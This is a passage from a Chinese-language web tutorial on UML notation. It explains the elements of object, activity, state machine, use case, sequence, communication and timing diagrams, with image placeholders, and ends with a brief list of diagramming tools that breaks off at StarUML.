<h3 id="部件"><a href="#部件" class="headerlink" title="部件"></a>部件</h3><p>部件是代表一组（一个或多个）实例的元素，这组实例的拥有者是一类元实例，例如：如果一个图的实例有一组图形元素，则这些图形元素可以被表示为部件，并可以对他们之间的某种关系建模。注意：一个部件可以在它的父类被删除之前从父类中被去掉，这样部件就不会被同时删除了。<br>部件在类或组件内部显示为不加修饰的方框。</p>
<figure class="image-box">
                <img src="28.gif" alt title class>
                <p></p>
            </figure>

<h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>端口是类型化的元素，代表一个包含类元实例的外部可视的部分。端口定义了类元和它的环境之间的交互。端口显示在包含它的部件，类或组合结构的边缘上。端口指定了类元提供的服务，以及类元要求环境提供的服务。<br>端口显示为所属类元边界指定的方框。</p>
<figure class="image-box">
                <img src="29.gif" alt title class>
                <p></p>
            </figure>

<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>接口与类相似，但是有一些限制，所有的接口操作都是公共和抽象的，不提供任何默认的实现。所有的接口属性都必须是常量。然而，当一个类从一个单独的超级类继承而来，它可以实现多个接口。<br>当一个接口在图中单列出来，它既可以显示为类元素的方框，带 «interface» 关键字和表明它是抽象的斜体名称，也可以显示为圆环。</p>
<figure class="image-box">
                <img src="30.gif" alt title class>
                <p></p>
            </figure>

<p>注意：圆环标注不显示接口操作。当接口显示为类所有的接口，它们会被当作暴露接口引用。暴露接口可以定义为是提供的，还是需求的。提供接口确认包含它的类元提供指定接口元素定义的操作，可通过类和接口间实现的连接来定义。需求接口说明该类元能与其他类元进行通信，这些类元提供了指定接口元素所定义的操作。需求接口可通过在类和接口间建立依赖连接来定义。<br>提供接口显示为“带棒球体”，依附在类元边缘。需求接口显示为“带棒杯体”，也是依附在类元边缘。</p>
<figure class="image-box">
                <img src="31.gif" alt title class>
                <p></p>
            </figure>

<h3 id="委托"><a href="#委托" class="headerlink" title="委托"></a>委托</h3><p>委托连接器用来定义组件外部端口和接口的内部工作方式。委托连接器表示为带有 «delegate» 关键字的箭头。它连接组件的外部约定，表现为它的端口，到组件部件行为的内部实现。</p>
<figure class="image-box">
                <img src="32.gif" alt title class>
                <p></p>
            </figure>

<h3 id="协作"><a href="#协作" class="headerlink" title="协作"></a>协作</h3><p>协作定义了一系列共同协作的角色，它们集体展示一个指定的设计功能。协作图应仅仅显示完成指定任务或功能的角色与属性。隔离主要角色是用来简化结构和澄清行为，也用于重用。一个协作通常实现一个模式。<br>协作元素显示为椭圆。</p>
<figure class="image-box">
                <img src="33.gif" alt title class>
                <p></p>
            </figure>

<h3 id="角色绑定"><a href="#角色绑定" class="headerlink" title="角色绑定"></a>角色绑定</h3><p>角色绑定连接器是一条从连接协作到所要完成该任务类元的连线。它显示为虚线，并在类元端显示作用名。</p>
<figure class="image-box">
                <img src="34.gif" alt title class>
                <p></p>
            </figure>

<h3 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h3><p>表现连接器用于连接协作到类元来表示此类元中使用了该协作。显示为带关键字 «represents»的虚线箭头。</p>
<figure class="image-box">
                <img src="35.gif" alt title class>
                <p></p>
            </figure>

<p>发生<br>发生连接器用于连接协作到类元来表示此协作表现了（同原文）该类元；显示为带关键字«occurrence»的虚线箭头。</p>
<figure class="image-box">
                <img src="36.gif" alt title class>
                <p></p>
            </figure>

<h2 id="对象图"><a href="#对象图" class="headerlink" title="对象图"></a>对象图</h2><blockquote>
<p><strong>对象图（Object Diagram）可以认为是类图的特殊情形，是类图元素子集，被用来及时强调在某些点，类的实例间的关系</strong>。这对理解类图很有帮助。他们在构造上与类图显示没有不同，但是反映出多样性和作用。</p>
</blockquote>
<h3 id="类和对象元素"><a href="#类和对象元素" class="headerlink" title="类和对象元素"></a>类和对象元素</h3><p>下面的图显示了类元素和对象元素外观上的不同。注意：类元素包括三个部分，分别是名字栏，属性栏和操作栏；对象元素默认为没有分栏。名称显示也有不同：对象名称有下划线，并可能显示该对象实例化所用类元的名称。</p>
<figure class="image-box">
                <img src="37.gif" alt title class>
                <p></p>
            </figure>

<h3 id="运行状态"><a href="#运行状态" class="headerlink" title="运行状态"></a>运行状态</h3><p>类元元素可以有任意数量的属性和操作。在对象实例中不会被显示出来。但可能定义对象的运行状态，显示特殊实例的属性设置值。</p>
<figure class="image-box">
                <img src="38.gif" alt title class>
                <p></p>
            </figure>

<h3 id="类和对象图示例"><a href="#类和对象图示例" class="headerlink" title="类和对象图示例"></a>类和对象图示例</h3><p>下图是一个对象图，其中插入了类定义图。它例示如何用对象图来测试类图中任务多重性的方法。“car” 类对 “wheel” 类有“1 对多” 的多重性，但是如果已经选择用“1 对 4” 来替代，那样就不会在对象图显示“3 个轮子”的汽车。</p>
<figure class="image-box">
                <img src="39.gif" alt title class>
                <p></p>
            </figure>

<h2 id="活动图"><a href="#活动图" class="headerlink" title="活动图"></a>活动图</h2><blockquote>
<p>UML 中，活动图用来展示活动的顺序。<strong>显示了从起始点到终点的工作流，描述了活动图中存在于事件进程的判断路径</strong>。活动图可以用来详细阐述某些活动执行中发生并行处理的情况。活动图对业务建模也比较有用，用来详细描述发生在业务活动中的过程。<br>一个活动图的示例如下所示。</p>
</blockquote>
<figure class="image-box">
                <img src="40.gif" alt title class>
                <p></p>
            </figure>

<p>下面描述组成活动图的元素。</p>
<h3 id="活动"><a href="#活动" class="headerlink" title="活动"></a>活动</h3><p>活动是行为参数化顺序的规范。活动被表示为圆角矩形，内含全部的动作，工作流和其他组成活动的元素。</p>
<figure class="image-box">
                <img src="41.gif" alt title class>
                <p></p>
            </figure>

<h3 id="动作"><a href="#动作" class="headerlink" title="动作"></a>动作</h3><p>一个动作代表活动中的一个步骤。动作用圆角矩形表示。</p>
<figure class="image-box">
                <img src="42.gif" alt title class>
                <p></p>
            </figure>

<h3 id="动作约束"><a href="#动作约束" class="headerlink" title="动作约束"></a>动作约束</h3><p>动作可以附带约束，下图显示了一个带前置条件和后置条件的动作。</p>
<figure class="image-box">
                <img src="43.gif" alt title class>
                <p></p>
            </figure>

<h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><p>控制流显示一个动作到下一个动作的流。表示为带箭头实线</p>
<figure class="image-box">
                <img src="44.gif" alt title class>
                <p></p>
            </figure>

<h3 id="初始节点"><a href="#初始节点" class="headerlink" title="初始节点"></a>初始节点</h3><p>一个开始或起始点用大黑圆点表示，如下图。</p>
<figure class="image-box">
                <img src="45.gif" alt title class>
                <p></p>
            </figure>

<h3 id="结束节点"><a href="#结束节点" class="headerlink" title="结束节点"></a>结束节点</h3><p>结束节点有两种类型：活动结束节点和流结束节点。活动结束节点表示为中心带黑点的圆环。</p>
<figure class="image-box">
                <img src="46.gif" alt title class>
                <p></p>
            </figure>

<p>流结束节点表示为内部为叉号的圆环。</p>
<figure class="image-box">
                <img src="47.gif" alt title class>
                <p></p>
            </figure>

<p>这两种不同类型节点的区别为：流结束节点表明单独的控制流的终点。活动结束终点是活动图内所有控制流的结束。</p>
<h3 id="对象和对象流"><a href="#对象和对象流" class="headerlink" title="对象和对象流"></a>对象和对象流</h3><p>对象流是对象和数据转递的通道。对象显示为矩形。</p>
<figure class="image-box">
                <img src="48.gif" alt title class>
                <p></p>
            </figure>

<p>对象流显示为带箭头的连接器，表明方向和通过的对象。</p>
<figure class="image-box">
                <img src="49.gif" alt title class>
                <p></p>
            </figure>

<p>一个对象流在它的至少一个终端有一个对象。在上图中，可以采用带输入输出引脚的速记标柱表示。</p>
<figure class="image-box">
                <img src="50.gif" alt title class>
                <p></p>
            </figure>

<p>数据存储显示为带 «datastore» 关键字的对象。</p>
<figure class="image-box">
                <img src="51.gif" alt title class>
                <p></p>
            </figure>

<h3 id="判断节点和合并节点"><a href="#判断节点和合并节点" class="headerlink" title="判断节点和合并节点"></a>判断节点和合并节点</h3><p>判断节点和合并节点是相同标注：菱形。它们可以被命名。从判断节点出来的控制流有监护条件，当监护条件满足时，可以对流控制。下图显示了判断节点和合并节点的使用。</p>
<figure class="image-box">
                <img src="52.gif" alt title class>
                <p></p>
            </figure>

<h3 id="分叉和结合节点"><a href="#分叉和结合节点" class="headerlink" title="分叉和结合节点"></a>分叉和结合节点</h3><p>分叉和结合节点有同样的标柱：垂直或水平条（方向取决于工作流从左到右，还是从上到下）。它们说明了控制的并发线程的起始和终点，下图显示他们的使用示例。</p>
<figure class="image-box">
                <img src="53.gif" alt title class>
                <p></p>
            </figure>

<p>结合节点与合并节点不同之处在于：结合节点同步两个输入量，产生一个单独的输出量。来自结合节点的输出量要接收到所有的输入量后才能执行。合并节点直接将控制流传递通过。如果两个或更多的输入量到达合并节点。则它的输出流指定的动作会被执行两次或更多次。</p>
<h3 id="扩展域"><a href="#扩展域" class="headerlink" title="扩展域"></a>扩展域</h3><p>扩展域是会执行多次的结构活动域。输入输出扩展节点表示为一组“3 厢” ，代表多个选择项。关键词 “iterative”， “parallel” 或 “stream”显示在区域的左上角</p>
<figure class="image-box">
                <img src="54.gif" alt title class>
                <p></p>
            </figure>

<h3 id="异常处理器"><a href="#异常处理器" class="headerlink" title="异常处理器"></a>异常处理器</h3><p>异常处理器在活动图中可以建模。</p>
<figure class="image-box">
                <img src="55.gif" alt title class>
                <p></p>
            </figure>

<h3 id="可中断活动区"><a href="#可中断活动区" class="headerlink" title="可中断活动区"></a>可中断活动区</h3><p>可中断活动区环绕一组可以中断的动作。在下面非常简单的例子中： 当控制被传递到结束订单 “Close Order” 动作，定单处理”Process Order” 动作会执行直到完成，除非”Cancel Request”取消请求中断被接受，这会将控制传递给”Cancel Order”动作。</p>
<figure class="image-box">
                <img src="56.gif" alt title class>
                <p></p>
            </figure>

<h3 id="分割"><a href="#分割" class="headerlink" title="分割"></a>分割</h3><p>一个活动分割显示为垂直或水平泳道。在下图中，分割被用来在活动图中分隔动作，有在 “accounting department”中执行的，有在 “customer”中执行的。</p>
<figure class="image-box">
                <img src="57.gif" alt title class>
                <p></p>
            </figure>

<h2 id="状态机图"><a href="#状态机图" class="headerlink" title="状态机图"></a>状态机图</h2><blockquote>
<p><strong>状态机图（state-machine-diagram）对一个单独对象的行为建模，指明对象在它的整个生命周期里，响应不同事件时，执行相关事件的顺序。</strong></p>
</blockquote>
<p>如下示例， 下列的状态机图显示了门在它的整个生命周期里如何运作。</p>
<figure class="image-box">
                <img src="58.gif" alt title class>
                <p></p>
            </figure>

<p>门可以处于以下的三种状态之一： “Opened”打开状态， “Closed”关闭状态，或者”Locked”锁定状态。 它分别响应事件：“Open”开门， “Close”关门， “Lock”锁门 和 “Unlock”解锁。 注意：不是所有的事件，在所有的状态下都是有效的。如：一个门打开的时候是不可能锁定的，除非你关上门。并且，状态转移可能有附加监护条件：假设门是开的，如果“doorWay-&gt;isEmpty”（门是空的）被满足，那么它只能响应关门事件。状态机图使用的语法和约定将在下面的部分进行讨论。</p>
<h3 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h3><p>状态被表示为圆角矩形，状态名写在里面。</p>
<figure class="image-box">
                <img src="59.gif" alt title class>
                <p></p>
            </figure>

<h3 id="起始和结束状态"><a href="#起始和结束状态" class="headerlink" title="起始和结束状态"></a>起始和结束状态</h3><p>初始状态表示为实心黑圆环，可以标注名称。结束状态表示为中心带黑点圆环，也可以被标注名称。</p>
<figure class="image-box">
                <img src="60.gif" alt title class>
                <p></p>
            </figure>

<h3 id="转移"><a href="#转移" class="headerlink" title="转移"></a>转移</h3><p>一个状态到下一个状态的转移表示为带箭头实线。转移可以有一个“Trigger”触发器，一个“Guard”监护条件和一个“effect”效果。如下所示：</p>
<figure class="image-box">
                <img src="61.gif" alt title class>
                <p></p>
            </figure>

<p>“Trigger”触发器是转移的起因，它可以是某个条件下的一个信号，一个事件，一个变化或一个时间通路。”Guard”监护是一个条件，而且必须为真，以便于让触发器引起转移。效果”Effect”是直接作用到对象上的一个动作，该对象具有做为转移结果的状态机。</p>
<h3 id="状态活动"><a href="#状态活动" class="headerlink" title="状态活动"></a>状态活动</h3><p>在上面的状态转移示例中，一个效果与该转移相关联。如果目标状态有多个转移到达，并且每一个转移都有相同的效果与它相关联，那最好将该效果与目标状态相关联，而不与转移相关联。你可以通过为这个状态定义初始动作来实现。下图显示了一个带入口动作和出口动作的状态。</p>
<figure class="image-box">
                <img src="62.gif" alt title class>
                <p></p>
            </figure>

<p>可以定义发生在事件上的动作或一直发生的动作。每一种类型的动作是可以定义任意数量的。</p>
<h3 id="自转移"><a href="#自转移" class="headerlink" title="自转移"></a>自转移</h3><p>一个状态可能有一个返回到自身的转移，如下图。效果与转移关联是十分有帮助。</p>
<figure class="image-box">
                <img src="63.gif" alt title class>
                <p></p>
            </figure>

<h3 id="复合状态"><a href="#复合状态" class="headerlink" title="复合状态"></a>复合状态</h3><p>一个状态机图可以有子状态机图，如下图所示：</p>
<figure class="image-box">
                <img src="64.gif" alt title class>
                <p></p>
            </figure>

<p>可选择不同方式显示相同信息，如下图所示：</p>
<figure class="image-box">
                <img src="65.gif" alt title class>
                <p></p>
            </figure>

<p>上面版本的标注说明”Check PIN”的子状态机图显示在单独的图中。</p>
<h3 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h3><p>有时，你不想在正常的初始状态进入子状态机。例如下面的子状态机，它通常从”初始化”状态开始，但是如果因为某些原因，它不必执行初始化，可能靠转移到指定的入口点来从 “Ready” 状态开始。</p>
<figure class="image-box">
                <img src="66.gif" alt title class>
                <p></p>
            </figure>

<p>下图显示了状态机的上一层。</p>
<figure class="image-box">
                <img src="67.gif" alt title class>
                <p></p>
            </figure>

<h3 id="出口点"><a href="#出口点" class="headerlink" title="出口点"></a>出口点</h3><p>有与入口点相类似的方式，它可能也指定可选择的出口点。下图给出了主处理状态执行后，所执行状态的去向将取决于该状态转移时所使用的路径。</p>
<figure class="image-box">
                <img src="68.gif" alt title class>
                <p></p>
            </figure>

<h3 id="选择伪状态"><a href="#选择伪状态" class="headerlink" title="选择伪状态"></a>选择伪状态</h3><p>选择伪状态显示为菱形，有一个转移输入，两个或多个输出。下图显示不管到达哪一个状态，经过选择伪状态后的去向，取决于在伪状态中执行时所选择的消息格式。</p>
<figure class="image-box">
                <img src="69.gif" alt title class>
                <p></p>
            </figure>

<h3 id="连接伪状态"><a href="#连接伪状态" class="headerlink" title="连接伪状态"></a>连接伪状态</h3><p>连接伪状态用来将多个状态转移链接在一起。一个单独的连接伪状态可以有一个或多个输入和一个或多个输出，监护可能应用于每一个转移，连接是没有语义的。连接可以把一个输入转移分成多个输出转移来实现一个静态分支。与之对照的是选择伪状态实现一个动态条件分支。</p>
<figure class="image-box">
                <img src="70.gif" alt title class>
                <p></p>
            </figure>

<h3 id="终止伪状态"><a href="#终止伪状态" class="headerlink" title="终止伪状态"></a>终止伪状态</h3><p>进入终止伪状态是指状态机生命线已经终止。终止伪状态表示为叉号。</p>
<figure class="image-box">
                <img src="71.gif" alt title class>
                <p></p>
            </figure>

<h3 id="历史状态"><a href="#历史状态" class="headerlink" title="历史状态"></a>历史状态</h3><p>历史状态用来当状态机中断时，恢复状态机之前状态。下面例图说明了历史状态的使用。这个例子是关于洗衣机的状态机。</p>
<p>在这个状态机中，当洗衣机运行时，它会按照”Washing” 到 Rinsing”再到”Spinning”来进行。如果电源被切断 ，洗衣机会停止运行并进入”Power Off” 状态。当电源恢复，运行状态在”History State”符号处进入，表示它会从上次离开的地方恢复。</p>
<h3 id="并发区"><a href="#并发区" class="headerlink" title="并发区"></a>并发区</h3><p>一个状态可以被分成几个不同的区，包含同时存在和执行的子状态。下面的例子显示状态 “Applying Brakes”， “front brake”和”rear brakes” 将同时独立运作。注意使用了分叉和结合伪状态而不是选择和合并伪状态。这些符号用来同步并发的线程。</p>
<figure class="image-box">
                <img src="72.gif" alt title class>
                <p></p>
            </figure>

<h2 id="用例图"><a href="#用例图" class="headerlink" title="用例图"></a>用例图</h2><blockquote>
<p><strong>用例图用来记录系统的需求，它提供系统与用户及其他参与者的一种通信手段。</strong></p>
</blockquote>
<h3 id="执行者"><a href="#执行者" class="headerlink" title="执行者"></a>执行者</h3><p>用例图显示了系统和系统外实体之间的交互。这些实体被引用为执行者。执行者代表角色，可以包括：用户，外部硬件和其他系统。执行者往往被画成简笔画小人。也可以用带«actor»关键字的类矩形表示。</p>
<figure class="image-box">
                <img src="73.gif" alt title class>
                <p></p>
            </figure>

<p>在下图中，执行者可以详细的泛化其他执行者:</p>
<figure class="image-box">
                <img src="74.gif" alt title class>
                <p></p>
            </figure>

<h3 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h3><p>用例是有意义的单独工作单元。它向系统外部的人或事提供一个易于观察的高层次行为视图。 用例的标注符号是一个椭圆。</p>
<figure class="image-box">
                <img src="75.gif" alt title class>
                <p></p>
            </figure>

<p>使用用例的符号是带可选择箭头的连接线，箭头显示控制的方向。下图说明执行者 “Customer”使用 “Withdraw”用例。</p>
<figure class="image-box">
                <img src="76.gif" alt title class>
                <p></p>
            </figure>

<p>用途连接器（uses connector）可以有选择性的在每一个端点有多重性值，如下图，显示客户一次可能只执行一次取款交易。但是银行可以同时执行许多取款交易。</p>
<figure class="image-box">
                <img src="77.gif" alt title class>
                <p></p>
            </figure>

<h3 id="用例定义"><a href="#用例定义" class="headerlink" title="用例定义"></a>用例定义</h3><p>一个典型的用例包括:</p>
<ul>
<li><strong>名称和描述</strong> - 用例通常用一个动词词组定义，而且有一个简短的文字说明。</li>
<li><strong>需求</strong> - 需求定义了一个用例必须提供给终端用户的正式功能性需求。它们符合构造方法建立的功能性规范。一个需求是用例将执行一个动作或提供多个值给系统的约定或承诺。</li>
<li><strong>约束</strong> - 一个约束是一个用例运行的条件或限制。它包括：前置条件，后置条件和不变化条件 。前置条件指明了用例在发生之前需要符合的条件。后置条件用来说明在用例执行之后一些条件必须为”真”。不变化条件说明用例整个执行过程中该条件始终为”真”。</li>
<li><strong>情形</strong> - 情形是用例的实例在执行过程中，事件发生流程的形式描述。它定义了系统和外部执行者之间的事件指定顺序。通常用文本方式来表示，并对应时序图中的文字描述。</li>
<li><strong>情形图</strong></li>
<li><strong>附加信息</strong></li>
</ul>
<h3 id="包含用例"><a href="#包含用例" class="headerlink" title="包含用例"></a>包含用例</h3><p>用例可能包含其他用例的功能来作为它正常处理的一部分。通常它假设，任何被包含的用例在基本程序运行时每一次都会被调用。下面例子：用例“卡的确认”<card identification> 在运行时，被用例“取钱”<withdraw>当作一个子部分。</withdraw></card></p>
<figure class="image-box">
                <img src="78.gif" alt title class>
                <p></p>
            </figure>

<p>用例可以被一个或多个用例包含。通过提炼通用的行为，将它变成可以多次重复使用的用例。有助于降低功能重复级别。</p>
<h3 id="扩展用例"><a href="#扩展用例" class="headerlink" title="扩展用例"></a>扩展用例</h3><p>一个用例可以被用来扩展另一个用例的行为，通常使用在特别情况下。例如：假设在修改一个特别类型的客户订单之前，用户必须得到某种更高级别的许可，然后“获得许可”<get approval>用例将有选择的扩展常规的“修改订单”<modify order>用例。</modify></get></p>
<figure class="image-box">
                <img src="79.gif" alt title class>
                <p></p>
            </figure>

<p><strong>扩展点</strong> - 扩展用例的加入点被定义为扩展点。</p>
<figure class="image-box">
                <img src="80.gif" alt title class>
                <p></p>
            </figure>

<p><strong>系统边界</strong> - 它用来显示用例在系统内部，执行者在系统的外部。</p>
<figure class="image-box">
                <img src="81.gif" alt title class>
                <p></p>
            </figure>

<h2 id="通信图"><a href="#通信图" class="headerlink" title="通信图"></a>通信图</h2><blockquote>
<p>通信图，以前称之为协作图，是一种交互图，<strong>所显示消息与时序图相似，但是它更侧重于对象间的联系</strong>。</p>
</blockquote>
<p>在通信图中，对象之间显示关联连接器。消息附加到这些关联上，显示短箭头指向消息流的方向。消息的顺序通过编号码显示。</p>
<p>下面的两个图用通信图和时序图分别显示相同的信息。尽管我们可能从通信图的编号码得到消息顺序，但它不是立即可见的。通信图十分清楚的显示了邻近对象间全部完整的消息传递。</p>
<figure class="image-box">
                <img src="82.gif" alt title class>
                <p></p>
            </figure>

<figure class="image-box">
                <img src="83.gif" alt title class>
                <p></p>
            </figure>

<h2 id="交互概述图"><a href="#交互概述图" class="headerlink" title="交互概述图"></a>交互概述图</h2><blockquote>
<p><strong>一个交互概览图是活动图的一种形式，它的节点代表交互图。交互图包含时序图，通信图，交互概览图和时间图。 大多数交互概览图标注与活动图一样。例如：起始，结束，判断，合并，分叉和结合节点是完全相同。并且，交互概览图介绍了两种新的元素：交互发生和交互元素。</strong></p>
</blockquote>
<h3 id="交互发生"><a href="#交互发生" class="headerlink" title="交互发生"></a>交互发生</h3><p>交互发生引用现有的交互图。显示为一个引用框，左上角显示 “ref” 。被引用的图名显示在框的中央。</p>
<figure class="image-box">
                <img src="84.gif" alt title class>
                <p></p>
            </figure>

<h3 id="交互元素"><a href="#交互元素" class="headerlink" title="交互元素"></a>交互元素</h3><p>交互元素与交互发生相似之处在于都是在一个矩形框中显示一个现有的交互图。不同之处在内部显示参考图的内容不同。</p>
<figure class="image-box">
                <img src="85.gif" alt title class>
                <p></p>
            </figure>

<h3 id="将它们放在一起"><a href="#将它们放在一起" class="headerlink" title="将它们放在一起"></a>将它们放在一起</h3><p>所有的活动图控件，都可以相同地被使用于交互概览图，如：分叉，结合，合并等等。它把控制逻辑放入较低一级的图中。下面的例子就说明了一个典型的销售过程。子过程是从交互发生抽象而来。</p>
<figure class="image-box">
                <img src="86.gif" alt title class>
                <p></p>
            </figure>

<h2 id="时序图"><a href="#时序图" class="headerlink" title="时序图"></a>时序图</h2><blockquote>
<p><strong>时序图是交互图的一种形式，它显示对象沿生命线发展，对象之间随时间的交互表示为从源生命线指向目标生命线的消息。时序图能很好地显示那些对象与其它那些对象通信，什么消息触发了这些通信，时序图不能很好显示复杂过程的逻辑。</strong></p>
</blockquote>
<h3 id="生命线"><a href="#生命线" class="headerlink" title="生命线"></a>生命线</h3><p>一条生命线在时序图中代表一个独立的参与者。表示为包含对象名的矩形，如果它的名字是”self”，则说明该生命线代表控制带时序图的类元。</p>
<figure class="image-box">
                <img src="87.gif" alt title class>
                <p></p>
            </figure>

<p>有时，时序图会包含一个顶端是执行者的生命线。这情况说明掌握这个时序图的是用例。健壮图中的边界，控制和实体元素也可以有生命线。</p>
<figure class="image-box">
                <img src="88.gif" alt title class>
                <p></p>
            </figure>

<h3 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h3><p>消息显示为箭头。消息可以完成传输，也可能丢失和找回，它可以是同步的，也可以是异步的，即可以是调用，也可以是信号。在下图中，第一条消息是同步消息(标为实箭头)完成传输，并隐含一条返回消息。第二条消息是异步消息 (标为实线箭头)，第三条是异步返回消息(标为虚线)。</p>
<figure class="image-box">
                <img src="89.gif" alt title class>
                <p></p>
            </figure>

<h3 id="执行发生"><a href="#执行发生" class="headerlink" title="执行发生"></a>执行发生</h3><p>向下延伸的细条状矩形表示执行事件或控制焦点的激活。在上图中有三个执行事件。第一个是源对象发送两条消息和收到两条回复。第二个是目标对象收到一条同步消息并返回一条回复。第三个是目标对象收到一条异步消息并返回一条回复。</p>
<h3 id="内部通信"><a href="#内部通信" class="headerlink" title="内部通信"></a>内部通信</h3><p>内部消息表现为一个操作的递归调用，或一个方法调用属于同一个对象的其他方法。显示为生命线上执行事件的嵌套控制焦点。</p>
<figure class="image-box">
                <img src="90.gif" alt title class>
                <p></p>
            </figure>

<h3 id="迷路消息和拾取消息"><a href="#迷路消息和拾取消息" class="headerlink" title="迷路消息和拾取消息"></a>迷路消息和拾取消息</h3><p>迷路消息是那些发送了却没有到达指定接收者，或者到达的接收者不再当前图中。拾取消息是收到来自那些未知的发送者，或者来自没有显示在当前图的发送者的消息。它们都表明是去往或来自一个终点元素。</p>
<figure class="image-box">
                <img src="91.gif" alt title class>
                <p></p>
            </figure>

<h3 id="生命线开始与结束"><a href="#生命线开始与结束" class="headerlink" title="生命线开始与结束"></a>生命线开始与结束</h3><p>生命线可以在时序图时间刻度范围内创建和销毁，在下面的例子中，生命线被停止符号（叉号）终止。在前面的例子中，生命线顶端的符号（Child）显示在比创建它的对象符号（parent）沿页面要低的位置上。下图显示创建和终止对象。</p>
<figure class="image-box">
                <img src="92.gif" alt title class>
                <p></p>
            </figure>

<h3 id="时间和期限约束"><a href="#时间和期限约束" class="headerlink" title="时间和期限约束"></a>时间和期限约束</h3><p>消息默认显示为水平线。因为生命线显示为沿屏幕向下的时间通道，所以当给实时系统建模，或是有时间约束的业务过程建模，考虑执行动作所需时间长度是很重要的。因此可以给消息设置一个期限约束，这样的消息显示为下斜线。</p>
<figure class="image-box">
                <img src="93.gif" alt title class>
                <p></p>
            </figure>

<h3 id="复合片段"><a href="#复合片段" class="headerlink" title="复合片段"></a>复合片段</h3><p>如前面所说，时序图不适合表达复杂的过程逻辑。在一种情况下，有许多机制允许把一定程度的过程逻辑加入到图中，并把它们放到复合片段的标题下。复合片段是一个或多个处理顺序被包含在一个框架中，并在指定名称的环境下执行。片段可以是:</p>
<ul>
<li>选择性片段 (显示 “alt”) 为 if…then…else 结构建模。</li>
<li>选项片段 (显示 “opt”) 为 “switch”(开关) 结构建模。</li>
<li>中断片段对被处理事件的可选择顺序建模，而不是该图的其他部分。</li>
<li>并行片段(显示 “par”) 为并发处理建模。</li>
<li>弱顺序片段 (显示 “seq”) 包含了一组消息，这组消息必须在后继片段开始之前被处理。但不会把片段内消息的先后顺序强加到不共享同一条生命线的消息上。</li>
<li>严格顺序片段 (显示 “strict”) 包含了一系列需要按照给定顺序处理的消息。</li>
<li>非片段 (显示 “neg”) 包含了一系列不可用的消息。</li>
<li>关键片段 具有关键部分。</li>
<li>忽略片段 声明一个没有意义的消息，如果它出现在当前上下文中。</li>
<li>考虑片段与忽略片段相反，不包含在考虑片段内的消息都应该被忽略。</li>
<li>断言片段 (显示 “assert”)标明任何没有显示为声明操作数的顺序都是无效的。</li>
<li>循环片段 包含一系列被重复的消息。</li>
</ul>
<p>下图显示的是循环片段：</p>
<figure class="image-box">
                <img src="94.gif" alt title class>
                <p></p>
            </figure>

<p>这也是一个类似于复合片段的交互发生。 交互发生被其他图参考，显示为左上角带”ref”，将被参考图名显示在方框的中间。</p>
<h3 id="门"><a href="#门" class="headerlink" title="门"></a>门</h3><p>门是连接片段内消息和片段外消息的连接点。 在 EA 中，门显示为片段框架上的小正方形。作用为时序图与页面外的连接器。 用来表示进来的消息源，或者出去消息的终点。下面两个图显示它们在实践中的使用。注意：” top level diagram”中的门用消息箭头指向参考片段，在这里没有必要把它画成方块。</p>
<figure class="image-box">
                <img src="95.gif" alt title class>
                <p></p>
            </figure>

<figure class="image-box">
                <img src="96.gif" alt title class>
                <p></p>
            </figure>

<h3 id="部分分解"><a href="#部分分解" class="headerlink" title="部分分解"></a>部分分解</h3><p>一个对象可以引出多条生命线，使得对象内部和对象之间的消息显示在同一图上。</p>
<figure class="image-box">
                <img src="97.gif" alt title class>
                <p></p>
            </figure>

<h3 id="状态常量-延续"><a href="#状态常量-延续" class="headerlink" title="状态常量/延续"></a>状态常量/延续</h3><p>状态常量是生命线的约束，运行时始终为”真”。显示为两侧半圆的矩形，如下图：</p>
<figure class="image-box">
                <img src="98.gif" alt title class>
                <p></p>
            </figure>

<p>延续虽与状态常量有同样的标注，但是被用于复合片段，并可以延伸跨越多条生命线。</p>
<h2 id="时间图"><a href="#时间图" class="headerlink" title="时间图"></a>时间图</h2><blockquote>
<p><strong>UML 时间图被用来显示随时间变化，一个或多个元素的值或状态的更改。也显示时控事件之间的交互和管理它们的时间和期限约束。</strong></p>
</blockquote>
<h3 id="状态生命线"><a href="#状态生命线" class="headerlink" title="状态生命线"></a>状态生命线</h3><p>状态生命线显示随时间变化，一个单项状态的改变。不论时间单位如何选择，X 轴显示经过的时间，Y 轴被标为给出状态的列表。状态生命线如下所示：</p>
<figure class="image-box">
                <img src="99.gif" alt title class>
                <p></p>
            </figure>

<h3 id="值生命线"><a href="#值生命线" class="headerlink" title="值生命线"></a>值生命线</h3><p>值生命线显示随时间变化，一个单项的值的变化。X 轴显示经过的时间，时间单位为任意，和状态生命线一样。平行线之间显示值，每次值变化，平行线交叉。如下图所示。</p>
<figure class="image-box">
                <img src="100.gif" alt title class>
                <p></p>
            </figure>

<h3 id="将它们放在一起-1"><a href="#将它们放在一起-1" class="headerlink" title="将它们放在一起"></a>将它们放在一起</h3><p>状态和值的生命线能叠加组合。它们必须有相同的 X 轴。 消息可以从一个生命线传递到另一个。每一个状态和值的变换能有一个定义的事件，一个时间限制是指一个事件何时必须发生，和一个期限限制说明状态或值多长时间必须有效。一旦这些已经被应用，其时间图可能显示如下。</p>
<figure class="image-box">
                <img src="101.gif" alt title class>
                <p></p>
            </figure>

<h2 id="UML-工具"><a href="#UML-工具" class="headerlink" title="UML 工具"></a>UML 工具</h2><p>UML 工具非常多，到底哪种工具好，真的是仁者见仁智者见智。这里列举一些我接触过的 UML 工具：</p>
<h3 id="亿图"><a href="#亿图" class="headerlink" title="亿图"></a>亿图</h3><blockquote>
<p>国内开发的、收费的绘图工具。图形模板、素材非常全面，样式也很精美，可以导出为 word、pdf、图片。</p>
<p><a href="http://www.edrawsoft.cn/" target="_blank" rel="noopener">亿图官网</a></p>
</blockquote>
<figure class="image-box">
                <img src="102.png" alt title class>
                <p></p>
            </figure>

<h3 id="Visio"><a href="#Visio" class="headerlink" title="Visio"></a>Visio</h3><blockquote>
<p>Office 的绘图工具，特点是简单、清晰。</p>
<p><a href="https://products.office.com/zh-cn/visio/flowchart-software" target="_blank" rel="noopener">Visio 官网</a></p>
</blockquote>
<figure class="image-box">
                <img src="103.png" alt title class>
                <p></p>
            </figure>

<h3 id="StarUML"><a href="#StarUML" class="headerlink" title="StarUML"></a>StarUML</h3><blockquote>
